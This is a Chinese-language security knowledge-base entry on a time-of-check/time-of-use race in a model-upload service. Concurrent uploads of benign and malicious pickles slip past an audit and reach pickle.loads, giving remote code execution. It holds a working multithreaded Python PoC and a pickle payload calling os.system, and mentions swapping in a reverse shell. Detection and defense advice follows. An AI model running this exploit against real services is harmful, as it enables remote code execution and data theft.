---
id: web-generic-race-condition-pickle-audit-save-before-check-toctou
title: 先落盘后审计的 TOCTOU：并发覆盖 pickle 绕过审计 RCE
type: scenario
domain: web
path: web/generic/race-condition
technique: save-before-audit-pickle-toctou
tags:
- web
- race-condition
- toctou
- pickle
- deserialization
- audit-bypass
- rce
- python
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V179
  verified_at: '2026-11-06T17:34:54+08:00'
  notes: 已对照原文 upload/predict 源码核对；合法/恶意 pickle 字节与竞态窗口一致；PoC 未复跑。
url: /docs/web/generic/race-condition/web-generic-race-condition-pickle-audit-save-before-check-toctou/
draft: false
kb_aliases:
- pickle 审计绕过
- 先写文件后审计
- TOCTOU 上传
- audit_ok 竞态
- 模型上传 RCE
---

## 一句话结论

当上传逻辑先把文件写入 `storage/models/{uid}.pkl`、再对同一份数据做安全审计、最后才更新数据库的 `audit_ok` 时，攻击者用同一会话并发上传“合法 pickle”和“恶意 pickle”，并高频触发 `pickle.loads`，可在数据库仍为 `audit_ok=1` 的窗口内读到恶意文件，实现反序列化 RCE。

## 原理

- 代码顺序是：`open(path,"wb").write(data)` → `audit(data)` → `INSERT/UPDATE users ... audit_ok = 1/0`。审计与状态更新发生在文件落盘之后，文件内容与数据库状态不是原子更新的。
- `predict` 先读数据库的 `audit_ok`，为 1 才读取 `model_path` 并 `pickle.loads`。它没有重新审计文件内容，也不校验文件哈希/版本是否与审计时一致。
- 竞态窗口有两段：合法上传把 `audit_ok` 置 1 后、恶意上传把 `audit_ok` 置 0 前；以及恶意上传刚覆盖文件、尚未更新数据库时。只要 `predict` 在其中一个窗口读到恶意字节且看到 `audit_ok=1`，就会反序列化执行。
- 合法 pickle 用 `I1\n.`（push int 1 + STOP），只含 `INT`/`STOP` 等安全 opcode，能通过 `pickletools.genops` 的白名单；恶意 pickle 用 `cos\nsystem\n(S'cmd'\ntR.`：`c` = GLOBAL（`os` `system`）、`(` = MARK、`S'cmd'` = 字符串、`t` = TUPLE、`R` = REDUCE、`.` = STOP，会在 `pickle.loads` 时调用 `os.system(cmd)`。
- `isinstance(model, BaseModel)` 检查发生在 `pickle.loads` 之后，无法阻止反序列化阶段的代码执行；`BaseModel` 约束只对“已加载对象”生效，为时已晚。
- 该手法本质是 TOCTOU（检查时/使用时不一致）：安全决策基于旧文件/旧状态，实际使用的却是新文件。

## 触发条件

- 上传接口把用户文件写入可预测路径（如按 `uid` 覆盖同一文件），且在写入之后才做审计。
- 审计结果与文件内容分开存储（数据库 `audit_ok`），读取时只信任该状态，不重新校验文件。
- 存在使用 `pickle.loads`（或其它不安全反序列化）加载该文件的接口，且该接口只检查 `audit_ok`。
- 攻击者能在同一会话内并发上传合法/恶意文件并高频触发加载接口；服务器多线程/多 worker 共享文件系统与数据库。

## 利用步骤

1. 确认上传路径按用户/会话固定，且同一用户再次上传会覆盖同一文件；确认审计与数据库更新在写入之后。
2. 准备两个 pickle：合法 `I1\n.`（通过审计）与恶意 `cos\nsystem\n(S'env > static/1.txt'\ntR.`（被审计标记为危险）。
3. 用同一会话开多线程：若干线程循环上传合法文件，若干线程循环上传恶意文件，若干线程循环请求预测接口。
4. 预测接口在某个瞬间读到恶意文件且 `audit_ok=1`，`pickle.loads` 执行 `os.system`，把 `env` 写入 Web 可访问的 `static/1.txt`。
5. 轮询 `/static/1.txt`，出现内容即成功；随后可换成反弹 shell、读 flag 等命令。

## PoC

```python
import os, requests, threading, time

URL = "http://target"
CMD = "env > static/1.txt"   # 命令结果写到可访问目录

open("valid.pkl", "wb").write(b"I1\n.")
open("exploit.pkl", "wb").write(b"cos\nsystem\n(S'" + CMD.encode() + b"'\ntR.")

s = requests.Session()
s.get(URL)  # 建立会话/UID

def upload(name):
    while True:
        with open(name, "rb") as f:
            try:
                s.post(f"{URL}/model/upload",
                       files={"model_file": ("a.pkl", f)}, timeout=2)
            except Exception:
                pass
        time.sleep(0.01)

def trigger():
    while True:
        try:
            s.get(f"{URL}/model/predict?text=t", timeout=2)
            r = requests.get(f"{URL}/static/1.txt", timeout=2).text
            if len(r) > 20:
                print(r)
                os._exit(0)
        except Exception:
            pass

for _ in range(5):
    threading.Thread(target=upload, args=("valid.pkl",), daemon=True).start()
for _ in range(5):
    threading.Thread(target=upload, args=("exploit.pkl",), daemon=True).start()
for _ in range(5):
    threading.Thread(target=trigger, daemon=True).start()

while True:
    time.sleep(1)
```

恶意 pickle 的结构（等价字节）：

```text
c os\nsystem\n(S'env > static/1.txt'\ntR.
```

## 变体与关联

- 变体：审计与文件写入顺序反过来（先审计后写）仍可能有竞态，如果审计的是临时文件而写入的是另一份内容，或审计后、写入前文件被替换。
- 变体：把 pickle 换成 `torch.load`、`joblib.load`、`yaml.load`、`dill` 等其它可执行反序列化格式；审计只检查字节特征时同样可绕。
- 变体：状态位换成“审核中/已通过”、文件版本号、哈希字段等；核心是“检查对象”和“使用对象”不是同一份不可变数据。
- 关联：[[web-generic-file-upload-save-then-validate-race]]（上传先落盘后删除的竞态）、[[web-python-deserialization-pickle-codetype-function-hijack]]（pickle 反序列化利用）、[[web-generic-race-condition-tip-reputation-role-escalation]]（竞态提权）。
- 边界：上传路径按随机名隔离、审计与写入在同一事务/原子重命名中完成、加载前重新审计并比对哈希、或使用安全反序列化格式时，本链失效；竞态窗口和线程数需按目标环境调整。

## 检测与防御

- 先把数据写入临时文件并完成全部审计，审计通过后再原子重命名到正式路径；文件与 `audit_ok` 状态在同一事务中更新，或把审计结果绑定到文件哈希。
- 不要用 `pickle` 加载不可信模型；使用 `safetensors`、ONNX、JSON 等安全格式，或使用带 `find_class` 白名单的受限 `Unpickler`。
- 加载前重新校验文件哈希/签名，并确认哈希与审计时一致；对同一用户并发上传/覆盖做串行化或拒绝。
- 预测接口不要在读取 `audit_ok` 后使用可能已被替换的文件；使用文件锁/版本号/不可变快照。
- 检测：同一用户短时间大量覆盖上传、合法/恶意文件交替出现；`audit_ok` 在 1/0 间频繁翻转；`/model/predict` 与上传请求高频并发；Web 目录出现命令输出文件或异常子进程。
